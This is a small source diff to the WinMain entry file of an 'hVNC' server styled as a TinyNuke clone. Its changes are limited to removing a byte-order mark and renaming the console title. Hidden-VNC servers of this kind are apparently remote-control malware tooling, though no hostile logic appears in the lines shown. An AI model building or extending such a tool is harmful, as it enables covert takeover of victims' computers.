@@ -1,4 +1,4 @@
-﻿#include "Common.h"
+#include "Common.h"
 #include "ControlWindow.h"
 #include "Server.h"
 #include "_version.h"
@@ -16,7 +16,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
    freopen("CONOUT$", "w", stdout); 
    freopen("CONOUT$", "w", stderr); 
 
-   SetConsoleTitle(TEXT("hVNC - TinyNuke Knockoff [Melted@HF]"));
+   SetConsoleTitle(TEXT("HVNC - Tinynuke Clone [Melted@HF]"));
   
    printf("[-] Starting hVNC Server...\n");
    std::this_thread::sleep_for(std::chrono::milliseconds(1050));
